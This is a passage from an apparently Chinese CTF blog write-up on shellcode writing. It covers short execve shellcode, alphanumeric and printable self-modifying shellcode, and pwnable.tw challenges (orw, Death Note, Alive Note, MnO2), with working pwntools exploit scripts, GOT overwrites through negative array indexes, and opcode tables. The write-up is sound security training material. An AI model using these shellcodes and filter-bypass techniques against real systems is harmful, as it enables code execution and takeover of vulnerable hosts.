*/───────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────── ► 0x7fffffffe590    push   rax   0x7fffffffe591    or     al, byte ptr [rax]   0x7fffffffe593    add    byte ptr [rax], al   0x7fffffffe595    add    byte ptr [rax], al   0x7fffffffe597    add    byte ptr [rax], al   0x7fffffffe599    add    byte ptr [rax], al   0x7fffffffe59b    add    byte ptr [rax], al   0x7fffffffe59d    add    byte ptr [rax], al   0x7fffffffe59f    add    byte ptr [rcx], al   0x7fffffffe5a1    add    byte ptr [rax], al   0x7fffffffe5a3    add    byte ptr [rax], al</code></pre><p>Exploit：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *p = process(&#39;./main&#39;)context.arch = &#39;amd64&#39;sh = asm(&#39;&#39;&#39;    mov al, 59    push rbx    push rbx    pop rsi    pop rdx    mov rdi, 0x68732f6e69622f    push rdi    push rsp    pop rdi    syscall&#39;&#39;&#39;)info(disasm(sh))info(len(sh))gdb.attach(p)p.sendafter(&#39;shellcode&gt;&gt;\n&#39;, sh.ljust(0x40))p.interactive()</code></pre><p>构造 <code>read</code> 最短可以修改为 7 字节：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *p = process(&#39;./main&#39;)context.arch = &#39;amd64&#39;sh = asm(&#39;&#39;&#39;    xor rdx, rdx    mov dl, 0x90    syscall&#39;&#39;&#39;)info(disasm(sh))info(len(sh))gdb.attach(p)p.sendlineafter(&#39;shellcode&gt;&gt;\n&#39;, sh)payload = &#39;\x90&#39; * 0x20 + asm(shellcraft.sh())p.sendline(payload)p.interactive()</code></pre><h1 id="Alphanumeric-Shellcode"><a href="#Alphanumeric-Shellcode" class="headerlink" title="Alphanumeric Shellcode"></a>Alphanumeric Shellcode</h1><p>用上面 32 位的程序作为例子，输入长度不做限制，使用数字和字母来编写 shellcode。可以尝试看看大概有哪些能用的指令：</p><pre><code class="txt">a   61                      popab   62 41 42                bound  eax,QWORD PTR [ecx+0x42]c   63 41 42                arpl   WORD PTR [ecx+0x42],axd   64 41                   fs inc ecxe   65 41                   gs inc ecxf   66 41                   inc    cxg   67 41                   addr16 inc ecxh   68 41 42 43 44          push   0x44434241i   69 41 42 43 44 45 46    imul   eax,DWORD PTR [ecx+0x42],0x46454443j   6a 41                   push   0x41k   6b 41 42 43             imul   eax,DWORD PTR [ecx+0x42],0x43...p   70 41                   jo     0x43q   71 41                   jno    0x43r   72 41                   jb     0x43s   73 41                   jae    0x43t   74 41                   je     0x43u   75 41                   jne    0x43v   76 41                   jbe    0x43w   77 41                   ja     0x43x   78 41                   js     0x43y   79 41                   jns    0x43z   7a 41                   jp     0x43A   41                      inc    ecxB   42                      inc    edxC   43                      inc    ebxD   44                      inc    espE   45                      inc    ebpF   46                      inc    esiG   47                      inc    ediH   48                      dec    eaxI   49                      dec    ecxJ   4a                      dec    edxK   4b                      dec    ebxL   4c                      dec    espM   4d                      dec    ebpN   4e                      dec    esiO   4f                      dec    ediP   50                      push   eaxQ   51                      push   ecxR   52                      push   edxS   53                      push   ebxT   54                      push   espU   55                      push   ebpV   56                      push   esiW   57                      push   ediX   58                      pop    eaxY   59                      pop    ecxZ   5a                      pop    edx0   30 41 42                xor    BYTE PTR [ecx+0x42],al1   31 41 42                xor    DWORD PTR [ecx+0x42],eax2   32 41 42                xor    al,BYTE PTR [ecx+0x42]3   33 41 42                xor    eax,DWORD PTR [ecx+0x42]4   34 41                   xor    al,0x415   35 41 42 43 44          xor    eax,0x44434241...</code></pre><p>其中 <code>pop ebx</code> 是没有的，但是可以采用 <code>push</code> 系列的指令和 <code>popa</code> 来赋值。还有关键的一点是 <code>int 0x80</code> 并不存在，也需要使用一些 tricks。这里可以看到有异或的指令，如果控制了 <code>ecx</code>（将 shellcode 的地址赋给 <code>ecx</code>）和 <code>al</code>，就可以对指定部分的 shellcode 实现自修改。这里的情况是 shellcode 被读到栈上，可以通过 <code>inc</code> 和 <code>dec</code> 调整 <code>esp</code> 的位置，然后 <code>pop</code> 给 <code>ecx</code>。一般来说采用构造 <code>sys_read</code> 的方式来读入 <code>sys_execve</code> 的 shellcode 覆盖（自修改）原本的 shellcode。</p><p>原理大概如上，具体实现经过调试后才会更加熟悉，脚本：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.log_level = &#39;debug&#39;context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]p = process(&#39;./main&#39;)#gdb.attach(p)sh = (    &#39;DDDDDDDDDDDDDDDDDDDDY&#39; + # pop ecx    &#39;jDX4DH0AA&#39; + # 0xff ^ ord(&#39;2&#39;) =&gt; 0xcd    &#39;jDX4DH4K0AB&#39; + # 0xff ^ ord(&#39;9&#39;) ^ ord(&#39;F&#39;) =&gt; 0x80    &#39;jDX4D&#39; + # set eax=0    &#39;PQPPPPPPa&#39; + # set ebx    &#39;jzZ&#39; + # set edx=90    &#39;j7X44&#39; # set eax=3).ljust(0x41, &#39;P&#39;) + &#39;24&#39;print disasm(sh)print len(sh)p.sendlineafter(&#39;shellcode&gt;\n&#39;, sh)#raw_input(&#39;@&#39;)p.sendline(&#39;\x90&#39; * 70 + asm(shellcraft.sh()))p.interactive()</code></pre><h1 id="Child-Shellcode"><a href="#Child-Shellcode" class="headerlink" title="Child Shellcode"></a>Child Shellcode</h1><h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p>题目一开始 seccomp 设置了白名单，根据提示也可以知道只能使用 open、read、write 三个调用来读取 <code>/home/orw/flag</code>。然后可以输入长 0xC8 的 shellcode 执行：</p><pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp){  orw_seccomp();  printf(&quot;Give my your shellcode:&quot;);  read(0, &amp;shellcode, 0xC8u);  ((void (*)(void))shellcode)();  return 0;}</code></pre><p>写个汇编实现读取并输出的操作：</p><pre><code class="nasm">BITS 32_start:    sub esp, 200    mov dword [esp], 0x6d6f682f    mov dword [esp + 4], 0x726f2f65    mov dword [esp + 8], 0x6c662f77    mov dword [esp + 12], 0x6761_open:    mov eax, 5    mov ebx, esp    xor ecx, ecx    xor edx, edx    int 0x80_read:    mov ebx, eax    mov eax, 3    mov ecx, esp    mov edx, 100    int 0x80_write:    mov ebx, 1    mov ecx, esp    mov edx, eax    mov eax, 4    int 0x80_exit:    add esp, 200    ret</code></pre><p>用 nasm 编译后获取 flag：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *r = remote(&#39;chall.pwnable.tw&#39;, 10001)sh = open(&#39;sh&#39;, &#39;rb&#39;).read()r.recvuntil(&#39;Give my your shellcode:&#39;)r.sendline(sh)r.interactive()</code></pre><h2 id="Death-Note"><a href="#Death-Note" class="headerlink" title="Death Note"></a>Death Note</h2><p>程序没有开启 NX，可以跑 shellcode。程序是给了四个选项，增加、删除、查看 Note，以及退出程序：</p><pre><code class="cpp">int __cdecl __noreturn main(int argc, const char **argv, const char **envp){  int c; // eax  setvbuf(stdout, 0, 2, 0);  setvbuf(_bss_start, 0, 2, 0);  while ( 1 )  {    while ( 1 )    {      menu();      c = read_int();      if ( c != 2 )        break;      show_note();    }    if ( c &gt; 2 )    {      if ( c == 3 )      {        del_note();      }      else      {        if ( c == 4 )          exit(0);LABEL_13:        puts(&quot;Invalid choice&quot;);      }    }    else    {      if ( c != 1 )        goto LABEL_13;      add_note();    }  }}</code></pre><p>其中在 <code>read_int</code> 函数中发现用了 <code>atoi</code>，可以输入负数：</p><pre><code class="cpp">int read_int(){  char buf; // [esp+Ch] [ebp-1Ch]  unsigned int v2; // [esp+1Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  if ( read(0, &amp;buf, 0xFu) &gt; 0 )    return atoi(&amp;buf);  puts(&quot;read error&quot;);  exit(1);  return atoi(&amp;buf);}</code></pre><p>漏洞主要在 <code>add_note</code> 中，输入 idx 的时候只判断了不能大于 10，说明可以输入负数，那就可以读到 bss 上的其他部分，可以指向 GOT。接下来在输入了 Name 之后，会判断输入的字符串是否都是可打印字符：</p><pre><code class="cpp">unsigned int add_note(){  int idx; // [esp+8h] [ebp-60h]  char s; // [esp+Ch] [ebp-5Ch]  unsigned int v3; // [esp+5Ch] [ebp-Ch]  v3 = __readgsdword(0x14u);  printf(&quot;Index :&quot;);  idx = read_int();  if ( idx &gt; 10 )  {    puts(&quot;Out of bound !!&quot;);    exit(0);  }  printf(&quot;Name :&quot;);  read_input(&amp;s, 0x50u);  if ( !is_printable(&amp;s) )  {    puts(&quot;It must be a printable name !&quot;);    exit(-1);  }  note[idx] = strdup(&amp;s);  puts(&quot;Done !&quot;);  return __readgsdword(0x14u) ^ v3;}</code></pre><p>其中 <code>is_printable</code> 函数如下：</p><pre><code class="cpp">int __cdecl is_printable(char *s){  size_t i; // [esp+Ch] [ebp-Ch]  for ( i = 0; strlen(s) &gt; i; ++i )  {    if ( s[i] &lt;= 0x1F || s[i] == 0x7F )      return 0;  }  return 1;}</code></pre><p>看完 <code>add_note</code> 基本上就有思路了，先是获取 <code>note</code> 到 <code>puts@got</code> 之间的偏移，作为 idx 输入。然后构造一个 shellcode 读入，相当于把 <code>puts@got</code> 改成了 shellcode，这样在 <code>strdup(&amp;s)</code> 之后就改好了 <code>puts@got</code>，在下一条语句调用 <code>puts</code> 的时候跑 shellcode。这里比 alphanumeric 的条件宽松些，大部分可用的指令如下：</p><pre><code class="txt">...(   28 41 42                sub    BYTE PTR [ecx+0x42],al)   29 41 42                sub    DWORD PTR [ecx+0x42],eax*   2a 41 42                sub    al,BYTE PTR [ecx+0x42]+   2b 41 42                sub    eax,DWORD PTR [ecx+0x42],   2c 41                   sub    al,0x41-   2d 41 42 43 44          sub    eax,0x44434241...0   30 41 42                xor    BYTE PTR [ecx+0x42],al1   31 41 42                xor    DWORD PTR [ecx+0x42],eax2   32 41 42                xor    al,BYTE PTR [ecx+0x42]3   33 41 42                xor    eax,DWORD PTR [ecx+0x42]4   34 41                   xor    al,0x415   35 41 42 43 44          xor    eax,0x44434241...@   40                      inc    eaxA   41                      inc    ecxB   42                      inc    edxC   43                      inc    ebxD   44                      inc    espE   45                      inc    ebpF   46                      inc    esiG   47                      inc    ediH   48                      dec    eaxI   49                      dec    ecxJ   4a                      dec    edxK   4b                      dec    ebxL   4c                      dec    espM   4d                      dec    ebpN   4e                      dec    esiO   4f                      dec    ediP   50                      push   eaxQ   51                      push   ecxR   52                      push   edxS   53                      push   ebxT   54                      push   espU   55                      push   ebpV   56                      push   esiW   57                      push   ediX   58                      pop    eaxY   59                      pop    ecxZ   5a                      pop    edx[   5b                      pop    ebx\   5c                      pop    esp]   5d                      pop    ebp^   5e                      pop    esi_   5f                      pop    edi`   60                      pushaa   61                      popa...h   68 41 42 43 44          push   0x44434241i   69 41 42 43 44 45 46    imul   eax,DWORD PTR [ecx+0x42],0x46454443k   6b 41 42 43             imul   eax,DWORD PTR [ecx+0x42],0x43...p   70 41                   jo     0x43q   71 41                   jno    0x43r   72 41                   jb     0x43s   73 41                   jae    0x43t   74 41                   je     0x43u   75 41                   jne    0x43v   76 41                   jbe    0x43w   77 41                   ja     0x43x   78 41                   js     0x43y   79 41                   jns    0x43z   7a 41                   jp     0x43{   7b 41                   jnp    0x43|   7c 41                   jl     0x43}   7d 41                   jge    0x43~   7e 41                   jle    0x43</code></pre><p>这里有 <code>sub</code> 指令，可以通过溢出多次减法来得到想要的字节：</p><pre><code class="python">x = 0x80 # 0xcdt = 0while True:    x = (x + 0x50) &amp; 0xFF    t += 1    if x &gt;= 0x20 and x &lt; 0x7F:        print t        print hex(x)        break</code></pre><p>简单地调试一下，看到执行 shellcode 的时候，四个通用寄存器这里 <code>edx</code> 指向了输入的 shellcode，这样的话之后会方便很多：</p><pre><code>─────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────── EAX  0xfffffff0 EBX  0x0 ECX  0x0 EDX  0x8b33008 ◂— 0x58 /* &#39;X&#39; */ EDI  0xf7753000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */ ESI  0xf7753000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */ EBP  0xfff18ac8 —▸ 0xfff18ad8 ◂— 0x0 ESP  0xfff18a4c —▸ 0x80487f4 (add_note+165) ◂— add    esp, 0x10 EIP  0x80484c0 (puts@plt) ◂— jmp    dword ptr [0x804a020]──────────────────────────────────────────[ DISASM ]─────────────────────────────────────────── ► 0x80484c0 &lt;puts@plt&gt;    jmp    dword ptr [0x804a020]    ↓   0x8b33008               pop    eax   0x8b33009               add    byte ptr [eax], al   0x8b3300b               add    byte ptr [eax], al   0x8b3300d               add    byte ptr [eax], al   0x8b3300f               add    byte ptr [eax], al   0x8b33011               add    byte ptr [eax], al   0x8b33013               add    cl, dh   0x8b33015               lar    eax, word ptr [eax]   0x8b33018               add    byte ptr [eax], al   0x8b3301a               add    byte ptr [eax], al</code></pre><p>脚本：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.log_level = &#39;debug&#39;local = 0if local:    p = process(&#39;./death_note&#39;)else:    p = remote(&#39;chall.pwnable.tw&#39;, 10201)elf = ELF(&#39;./death_note&#39;)def cmd(c):    p.recvuntil(&#39;choice :&#39;)    p.sendline(str(c))def add(idx, name):    cmd(1)    p.recvuntil(&#39;Index :&#39;)    p.sendline(str(idx))    p.recvuntil(&#39;Name :&#39;)    p.sendline(name)def show(idx):    cmd(2)    p.recvuntil(&#39;Index :&#39;)    p.sendline(str(idx))def delete(idx):    cmd(3)    p.recvuntil(&#39;Index :&#39;)    p.sendline(str(idx))def quit():    cmd(4)note = 0x0804A060offset = (elf.got[&#39;puts&#39;] - note) / 4sh = (    &#39;RY&#39; + # push edx &amp;&amp; pop ecx    &#39;jPX(A&quot;(A&quot;&#39; + # set eax=0x50 &amp;&amp; 2 * sub [0x41], 0x50    &#39;(A#(A#&#39; + # 2 * sub [0x42], 0x50    &#39;jCX4CP[&#39; + # set ebx=0    &#39;jpZ&#39; + # set edx=0x70    &#39;jCX,@&#39; # set eax=3).ljust(0x22, &#39;P&#39;) + &#39;m &#39;print len(sh)print disasm(sh)for c in sh:    if ord(c) &lt;= 0x1F or ord(c) &gt; 0x7F:        raise ValueError, &#39;Value error.&#39;#gdb.attach(p, &#39;b *0x080487EF&#39;)add(offset, sh)payload = &#39;\x90&#39; * 0x30 + asm(shellcraft.sh())#raw_input(&#39;@&#39;)p.sendline(payload)p.interactive()</code></pre><h1 id="Adult-Shellcode"><a href="#Adult-Shellcode" class="headerlink" title="Adult Shellcode"></a>Adult Shellcode</h1><h2 id="Alive-Note"><a href="#Alive-Note" class="headerlink" title="Alive Note"></a>Alive Note</h2><p>这道题的程序和上面的差不多，但具体利用部分有些不同。<code>add_note</code> 中一开始的数组越界还是存在的，后面读取 Name 的时候只能读 8 个字节，意味着 shellcode 只能 8 字节为单位地送，且 <code>check</code> 函数下面的提示说只能用 alphanumeric：</p><pre><code class="cpp">unsigned int add_note(){  int idx; // [esp+0h] [ebp-18h]  char s; // [esp+4h] [ebp-14h]  unsigned int v3; // [esp+Ch] [ebp-Ch]  v3 = __readgsdword(0x14u);  printf(&quot;Index :&quot;);  idx = read_int();  if ( idx &gt; 10 )  {    puts(&quot;Out of bound !!&quot;);    exit(0);  }  printf(&quot;Name :&quot;);  read_input(&amp;s, 8u);  if ( !check(&amp;s) )  {    puts(&quot;It must be a alnum name !&quot;);    exit(-1);  }  note[idx] = strdup(&amp;s);  puts(&quot;Done !&quot;);  return __readgsdword(0x14u) ^ v3;}</code></pre><p>在调试过程中，看到堆上大概是这样，prev_size 和 chunk_size 两个字段是固定的，剩下的 8 个字节可以填 shellcode：</p><pre><code>gef➤  x/4wx 0x0804b0000x804b000:    0x00000000    0x00000011    0x00000031    0x00000000</code></pre><p>固定的字段的 asm 只跟 <code>eax</code> 有关，如果要使用的话只需要确保 <code>eax</code> 指向的内存是存在的：</p><pre><code class="python">from pwn import *s = p32(0) + p32(0x11)print disasm(s)#   0:   00 00                   add    BYTE PTR [eax],al#   2:   00 00                   add    BYTE PTR [eax],al#   4:   11 00                   adc    DWORD PTR [eax],eax#   6:   00 00                   add    BYTE PTR [eax],al</code></pre><p>接下来看一下 check 函数，就是要保证输入的字符串是 alphanumeric 以及空格：</p><blockquote><p><code>__ctype_b_loc</code> 主要获取一个数组列表，可容纳 <code>-128~255</code> 范围的字符，对应字符值索引可获取到本地语言的字符集，对于要求的字符与掩码位求与即可得到该字符是否为某种掩码位类型的字符：</p></blockquote><pre><code class="cpp">int __cdecl check(char *s){  size_t i; // [esp+Ch] [ebp-Ch]  for ( i = 0; strlen(s) &gt; i; ++i )  {    if ( s[i] != 32 &amp;&amp; !((*__ctype_b_loc())[s[i]] &amp; 8) )      return 0;  }  return 1;}</code></pre><p>思路基本上就是第一次 add 的时候把 <code>free@got</code> 修改为堆上的 shellcode，接下来把 shellcode 分段送上去，最后 delete 掉第一次的 note 来执行 shellcode。先看看寄存器的状态：</p><pre><code>───────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────── EAX  0x99a9008 ◂— 0x58 /* &#39;X&#39; */ EBX  0x0 ECX  0x0 EDX  0x0 EDI  0xf76cb000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */ ESI  0xf76cb000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */ EBP  0xffd6f598 —▸ 0xffd6f5a8 ◂— 0x0 ESP  0xffd6f56c —▸ 0x80488ef (del_note+81) ◂— add    esp, 0x10 EIP  0x80484e0 (free@plt) ◂— jmp    dword ptr [0x804a014]────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────── ► 0x80484e0 &lt;free@plt&gt;    jmp    dword ptr [0x804a014]    ↓   0x99a9008               pop    eax   0x99a9009               add    byte ptr [eax], al   0x99a900b               add    byte ptr [eax], al   0x99a900d               add    byte ptr [eax], al   0x99a900f               add    byte ptr [eax], al   0x99a9011               add    byte ptr [eax], al   0x99a9013               add    cl, dh   0x99a9015               lar    eax, word ptr [eax]   0x99a9018               add    byte ptr [eax], al   0x99a901a               add    byte ptr [eax], al</code></pre><p>可以看到 <code>eax</code> 是指向了 shellcode，其他几个系统调用会用到的寄存器为 0。接下来要解决的主要问题就是中间的 padding 部分怎么绕过。可以把 <code>eax</code> 指向栈上，这样就不会干扰到，但这样的话在构造 shellcode 的时候还是挺麻烦的。最好的方法就是充分利用几个跳转指令，就不用在意中间的 padding，只需要计算好跳转的偏移，构造起来也比较麻烦，但效果远比前一种方法好。这里主要参考了这个 <a href="https://github.com/HyperSine/pwnable.tw/blob/master/Alive%20Note/solve.py" target="_blank" rel="noopener">Exploit</a>（几处跳转构造得太秀了）：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.log_level = &#39;debug&#39;local = 1if local:    p = process(&#39;./alive_note&#39;)else:    p = remote(&#39;chall.pwnable.tw&#39;, 10300)elf = ELF(&#39;./alive_note&#39;)def cmd(c):    p.recvuntil(&#39;choice :&#39;)    p.sendline(str(c))def add(idx, name):    cmd(1)    p.recvuntil(&#39;Index :&#39;)    p.sendline(str(idx))    p.recvuntil(&#39;Name :&#39;)    p.sendline(name)def show(idx):    cmd(2)    p.recvuntil(&#39;Index :&#39;)    p.sendline(str(idx))def delete(idx):    cmd(3)    p.recvuntil(&#39;Index :&#39;)    p.sendline(str(idx))def quit():    cmd(4)note = 0x0804A080offset = (elf.got[&#39;free&#39;] - note) / 4info(offset)padding = p32(0) + p32(0x11)#   0:   50                      push   eax#   1:   59                      pop    ecx#   2:   6a 7a                   push   0x7a#   4:   5a                      pop    edx#   5:   53                      push   ebx#   6:   75 38                   jne    0x40#   8:   00 00                   add    BYTE PTR [eax],al#   a:   00 00                   add    BYTE PTR [eax],al#   c:   11 00                   adc    DWORD PTR [eax],eax#   e:   00 00                   add    BYTE PTR [eax],al#  10:   34 46                   xor    al,0x46#  12:   30 41 35                xor    BYTE PTR [ecx+0x35],al#  15:   53                      push   ebx#  16:   75 38                   jne    0x50#  18:   00 00                   add    BYTE PTR [eax],al#  1a:   00 00                   add    BYTE PTR [eax],al#  1c:   11 00                   adc    DWORD PTR [eax],eax#  1e:   00 00                   add    BYTE PTR [eax],al#  20:   66 75 63                data16 jne 0x86#  23:   6b 50 50 50             imul   edx,DWORD PTR [eax+0x50],0x50#  27:   50                      push   eax#  28:   00 00                   add    BYTE PTR [eax],al#  2a:   00 00                   add    BYTE PTR [eax],al#  2c:   11 00                   adc    DWORD PTR [eax],eax#  2e:   00 00                   add    BYTE PTR [eax],al#  30:   58                      pop    eax#  31:   34 33                   xor    al,0x33#  33:   34 30                   xor    al,0x30#  35:   74 39                   je     0x70#  37:   50                      push   eax#  38:   00 00                   add    BYTE PTR [eax],al#  3a:   00 00                   add    BYTE PTR [eax],al#  3c:   11 00                   adc    DWORD PTR [eax],eax#  3e:   00 00                   add    BYTE PTR [eax],al#  40:   58                      pop    eax#  41:   48                      dec    eax#  42:   30 41 46                xor    BYTE PTR [ecx+0x46],al#  45:   75 36                   jne    0x7d#  47:   50                      push   eax#  48:   00 00                   add    BYTE PTR [eax],al#  4a:   00 00                   add    BYTE PTR [eax],al#  4c:   11 00                   adc    DWORD PTR [eax],eax#  4e:   00 00                   add    BYTE PTR [eax],al#  50:   30 41 36                xor    BYTE PTR [ecx+0x36],al#  53:   30 41 57                xor    BYTE PTR [ecx+0x57],al#  56:   75 61                   jne    0xb9sh = (    &#39;PYjzZSu8&#39; + padding +    &#39;4F0A5Su8&#39; + padding +    &#39;fuckPPPP&#39; + padding +    &#39;X4340t9P&#39; + padding +    &#39;XH0AFu6P&#39; + padding +    &#39;0A60AWua&#39;)print disasm(sh)sh = sh.split(padding)#gdb.attach(p, &#39;b *0x080488EA\nc&#39;)#sh = &#39;PYTXuA&#39;add(offset, sh[0])for i in range(5):    add(i, sh[i + 1])delete(offset)payload = &#39;\x90&#39; * 0x37 + asm(shellcraft.sh())#raw_input(&#39;@&#39;)p.sendline(payload)p.interactive()</code></pre><h1 id="Hell-Shellcode"><a href="#Hell-Shellcode" class="headerlink" title="Hell Shellcode"></a>Hell Shellcode</h1><h2 id="MnO2"><a href="#MnO2" class="headerlink" title="MnO2"></a>MnO2</h2><p>同样是 shellcode，这道题里只能用元素周期表中的元素以及数字：</p><pre><code class="txt">H He Li Be B C N O F Ne Na Mg Al Si P S Cl Ar K Ca Sc Ti V Cr Mn Fe Co Ni Cu Zn Ga Ge As Se Br Kr Rb Sr Y Zr Nb Mo Tc Ru Rh Pd Ag Cd In Sn Sb Te I Xe Cs Ba La Ce Pr Nd Pm Sm Eu Gd Tb Dy Ho Er Tm Yb Lu Hf Ta W Re Os Ir Pt Au Hg Tl Pb Bi Po At Rn Fr Ra Ac Th Pa U Np Pu Am Cm Bk Cf Es Fm Md No Lr Rf Db Sg Bh Hs Mt Ds Rg Cn Fl Lv0 1 2 3 4 5 6 7 8 9</code></pre><p>先试试大概有哪些能用。大部分都是一些 <code>inc</code> 和 <code>dec</code>，还有一些 <code>push</code> 和 <code>pop</code>，但这些肯定不够，还得用上一些元素的组合：</p><pre><code class="txt">[H]        dec eax[He]    dec eax ; xor gs:[ecx], xx[Li]    dec esp ; imul esi, [eax], xx[Be]    inc edx ; xor gs:[ecx], xx[B]        inc edx[C]        inc ebx[N]        dec esi[O]        dec edi[F]        inc esi[Ne]    dec esi ; xor gs:[ecx], xx[Na]    dec esi ; popa[Mg]    dec ebp ; xxxx[Al]    inc ecx ; ins es:[edi], dx[Si]    push ebx ; imul esi, [eax], xx[P]        push eax[S]        push ebx[Cl]    inc ebx ; ins es:[edi], dx[Ar]    inc ecx ; jb xx[K]        dec ebx[Ca]    inc ebx ; popa[Sc]    push ebx ; xxxx[Ti]    push esp ; imul esi, [eax], xxxx[V]        push esi[Cr]    inc ebx ; jb xx[Mn]    dec ebp ; outs dx, ds:[esi][Fe]    inc esi ; xxxx[Co]    inc ebx ; outs dx, ds:[esi][Ni]    dec esi ; imul esi, [eax], xxxx[Cu]    inc ebx ; jne xx[Zn]    pop edx ; outs dx, ds:[esi][Ga]    inc edi ; popa[Ge]    inc edi ; xxxx[As]    inc ecx ; jae xx[Se]    push ebx ; xxxx[Br]    inc edx ; jb xx[Kr]    dec ebx ; jb xx[Rb]    push edx ; xxxx[Sr]    push ebx ; jb xx[Y]        pop ecx[Zr]    pop edx ; jb xx[Nb]    dec esi ; xxxx[Mo]    dec ebp ; outs dx, ds:[esi][Tc]    push esp ; xxxx[Ru]    push edx ; jne xx[Rh]    push edx ; push xxxx[Pd]    push eax ; xxxx[Ag]    inc ecx ; xxxx[Cd]    inc ebx ; xxxx[In]    dec ecx ; outs dx, ds:[esi][Sn]    push ebx ; outs dx, ds:[esi][Sb]    push ebx ; xxxx[Te]    push esp ; xxxx[I]        dec ecx[Xe]    pop eax ; xxxx[Cs]    inc ebx ; jae xx[Ba]    inc edx ; popa[La]    dec esp ; popa[Ce]    inc ebx ; xxxx[Pr]    push eax ; jb xx[Nd]    dec esi ; xxxx[Pm]    push eax ; ins es:[edi], dx[Sm]    push ebx ; ins es:[edi], dx[Eu]    inc ebp ; jne xx[Gd]    inc edi ; xxxx[Tb]    push esp ; xxxx[Dy]    inc esp ; jns xx[Ho]    dec eax ; xxxx[Er]    inc ebp ; jb xx[Tm]    push esp ; ins es:[edi], dx[Yb]    pop ecx ; xxxx[Lu]    dec esp ; jne xx[Hf]    dec eax ; xxxx[Ta]    push esp ; popa[W]        push edi[Re]    push edx ; xxxx[Os]    dec edi ; jae xx[Ir]    dec ecx ; jb xx[Pt]    push eax ; je xx[Au]    inc ecx ; jne xx[Hg]    dex eax ; xxxx[Tl]    push esp ; ins es:[edi], dx[Pb]    push eax ; xxxx[Bi]    inc edx ; imul esi, [eax], xx[Po]    push eax ; outs dx, ds:[esi][At]    inc ecx ; je xx[Rn]    push edx ; outs dx, ds:[esi][Fr]    inc esi ; jb xx[Ra]    push edx ; popa[Ac]    inc ecx ; xxxx[Th]    push esp ; push xxxx[Pa]    push eax ; popa[U]        push ebp[Np]    dec esi ; jo xx[Pu]    push eax ; jne xx[Am]    inc ecx ; ins es:[edi], dx[Cm]    inc ebx ; ins es:[edi], dx[Bk]    inc edx ; imul esi, [eax], xx[Cf]    inc ebx ; xxxx[Es]    inc ebp ; jae xx[Fm]    inc esi ; ins es:[edi], dx[Md]    dec ebp ; xxxx[No]    dec esi ; outs dx, ds:[esi][Lr]    dec esp ; jb xx[Rf]    push edx ; xxxx[Db]    inc esp ; xxxx[Sg]    push xx ; xxxx[Bh]    inc edx ; push xxxx[Hs]    dec eax ; jae xx[Mt]    dec ebp ; je xx[Ds]    inc esp, jae xx[Rg]    push edx ; xxxx[Cn]    inc ebx ; outs dx, ds:[esi][Fl]    inc esi ; ins es:[edi], dx[Lv]    dec esp ; jbe xx</code></pre><p>再看看运行 shellcode 的时候寄存器的状态。可以发现 <code>eax</code> 指向了输入的 shellcode，<code>ebx</code> 和 <code>ecx</code> 分别为 0：</p><pre><code>─────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────── EAX  0x324f6e4d ◂— dec    ebp /* 0x324f6e4d; &#39;MnO2&#39; */ EBX  0x0 ECX  0x0 EDX  0x80488a1 ◂— dec    edi /* &#39;O&#39; */ EDI  0xf7fc5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0 ESI  0xf7fc5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0 EBP  0xffffd718 ◂— 0x0 ESP  0xffffd6dc —▸ 0x80487ea (main+169) ◂— mov    dword ptr [esp], 0 EIP  0x324f6e4d ◂— dec    ebp /* 0x324f6e4d; &#39;MnO2&#39; */───────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────── ► 0x324f6e4d    dec    ebp   0x324f6e4e    outsb  dx, byte ptr [esi]   0x324f6e4f    dec    edi   0x324f6e50    xor    al, byte ptr [eax]   0x324f6e52    add    byte ptr [eax], al   0x324f6e54    add    byte ptr [eax], al   0x324f6e56    add    byte ptr [eax], al   0x324f6e58    add    byte ptr [eax], al   0x324f6e5a    add    byte ptr [eax], al   0x324f6e5c    add    byte ptr [eax], al   0x324f6e5e    add    byte ptr [eax], al</code></pre><p>然后基本上就是继续找有用的部分来构造 <code>int 0x80</code>。试了好久发现 <code>Cf</code> 元素数字的组合发现可以构造出指定地址内容异或的指令：</p><pre><code class="python">In [1]: print disasm(&#39;Cf151111&#39;)   0:   43                      inc    ebx   1:   66 31 35 31 32 33 34    xor    WORD PTR ds:0x31313131,si</code></pre><p>而且题目没有开 ASLR，可以在固定的地址放上数据，通过异或构造出 <code>int 0x80</code>，最后根据寄存器的状态利用 <code>popa</code> 设置好寄存器的值，来触发 <code>read</code>，再把真正的 shellcode 传进去。</p><p>400 分的题就不放 Exploit 了。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://blog.csdn.net/qq_29343201/article/details/78109066" target="_blank" rel="noopener">https://blog.csdn.net/qq_29343201/article/details/78109066</a><br><a href="https://abda.nl/posts/2018/06/pwnable.tw-orw/" target="_blank" rel="noopener">https://abda.nl/posts/2018/06/pwnable.tw-orw/</a><br><a href="http://p4nda.top/2017/09/29/pwnable-tw-deathnote/" target="_blank" rel="noopener">http://p4nda.top/2017/09/29/pwnable-tw-deathnote/</a><br><a href="https://veritas501.space/2018/03/04/pwnable.tw%2011~18%E9%A2%98%20writeup/" target="_blank" rel="noopener">https://veritas501.space/2018/03/04/pwnable.tw%2011~18%E9%A2%98%20writeup/</a><br><a href="https://www.cnblogs.com/p4nda/p/7992951.html" target="_blank" 